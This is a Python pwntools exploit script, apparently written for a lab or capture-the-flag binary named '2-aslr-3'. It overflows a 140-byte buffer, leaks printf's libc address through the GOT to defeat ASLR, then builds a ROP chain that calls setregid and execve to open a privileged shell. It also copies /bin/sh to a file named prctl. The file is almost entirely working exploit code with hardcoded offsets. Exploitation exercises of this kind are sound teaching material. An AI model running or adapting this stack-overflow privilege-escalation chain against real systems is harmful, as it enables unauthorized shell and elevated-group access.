from pwn import *
from shutil import copyfile
context.arch = 'i386'

#puts_addr = e.got['puts']
copyfile('/bin/sh', './prctl', follow_symlinks=True)


PROG = "./2-aslr-3"
ARG1 = ''
ENV = {}

e = ELF(PROG)
# set ARG and ENV


p = process([PROG, ARG1], env=ENV)
libc = e.libc
p.recvline()

#p.recvuntil(b'printf')
printf_got = e.got['printf']
printf_plt = e.plt['printf']

#sm_libc = libc.symbols['__libc_start_main_ret']

#log.info(f"this is the sm offset: {hex(sm_libc)}")

#check_function = e.symbols['check_function']
#log.info(f"this is the check_function add: {hex(check_function)}")



pad = 140

payload = flat(
b'A' * pad
+ p32(printf_plt)
+ p32(e.symbols['input_func'])
+ p32(printf_got)
)

with open ("payload.bin", "wb") as f:
        f.write(payload)

#p.interactive()
p.sendline(payload)
#print(p.recv())
#p.recvline()
#leak_line= p.recvline()
#libc_adds = leak_line.split(':')[-1].strip().split(' ')
#addr = p.recv().split()
#print(addr
printf_leak= u32(p.recv(4))
print(p.recv())

log.info(f"these are the grabbed addr: {hex(printf_leak)}")
#libc_start_main = int(addreses[1].strip(), 16)
#log.info(f"this is the libc_start_main_address: {hex(libc_start_main)}")
libc_addr = printf_leak - libc.symbols['printf']

log.info(f"this is base libc?: {hex(libc_addr)}")

execve_addr = libc_addr + int('0xbf680', 16)
log.info(f"this is the exec addr?: {hex(execve_addr)}")

binsh_offset = next(e.libc.search(b'/bin/sh\00'))
binsh_addr = int ("0x17e1db", 16) + libc_addr

setregid_addr = int('0xf0cf0', 16) + libc_addr

gadget2 = int('0x0804861a', 16)
gadget = int('0x08048619', 16)
#p.recv()
bin = int('0x08048272', 16)
payload2 = flat(
        b'A' * pad
        + p32(setregid_addr)
        + p32(gadget2)
        + p32(60003) + p32(60003)
        + p32(execve_addr)
        + p32(0)
        + p32(bin)
        + p32(0)
        + p32(0)
)

with open ("payload2.bin", "wb") as f:
        f.write(payload2)
#p.recvline()
p.sendline(payload2)
p.recvline()
p.interactive()